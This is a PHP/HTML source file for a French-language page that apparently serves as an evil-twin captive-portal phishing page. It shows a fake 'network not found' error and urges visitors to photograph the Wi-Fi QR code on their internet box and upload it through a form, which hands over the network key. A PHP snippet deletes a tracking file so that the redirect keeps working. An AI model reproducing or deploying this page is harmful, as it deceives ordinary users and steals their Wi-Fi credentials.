<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
}
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Identification requise</title>

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/> 
<script type="text/javascript" src="js/jquery-1.11.3-jquery.min.js"></script>
<script type="text/javascript" src="script.js"></script>
<style>
    h2 { color: #000000;
font-family:sans-serif;
}
  </style>
</head>
<body>
<IMG class="displayed" src="qrcode1.png" height="150" width="200">
<br>
<p style="color:#808080;">Error code 0x0 : le réseau est introuvable.</p>
<br>
<p style="color:#808080;">Ce problème est souvent lié a une érreur réseau inconnue. Cela peut-etre aussi un ordinateur mal configuré connecté au réseau.</p>
<br>
<body>
<p style="color:#808080;">Recconnectez vous en utilisant le QR code de votre box. <b>Cette technique permet de ne pas avoir à écrire le code Wi-Fi. </b>Le QR code est situé sur la façade de l'écran digital de votre box ou sur l'étiquette située derrière votre box.</p>
<br>
	<center><IMG class="displayed" src="qrcode2.png"></center>
	<br>
	<br>
<p style="color:#808080;">Appuyez sur <b style='color:red;'>Choisir un fichier</b> ci-dessous pour prendre une photo du QR code. <b style='color:red;'>Ne faites pas de mouvement durant cette procédure</b> puis, appuyez sur <b style='color:red;'>Upload.</b> Si votre navigateur internet ne supporte pas cette option, ne fermez pas cette fenêtre. Utilisez directement votre appareil photo pour prendre en photo le QR code. Une fois la photo prise, revenez à cette fenêtre puis choissisez la photo dans votre gallerie et appuyez sur <b style='color:red;'>Upload</b></p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
</br>
</br>
</body>
</html>
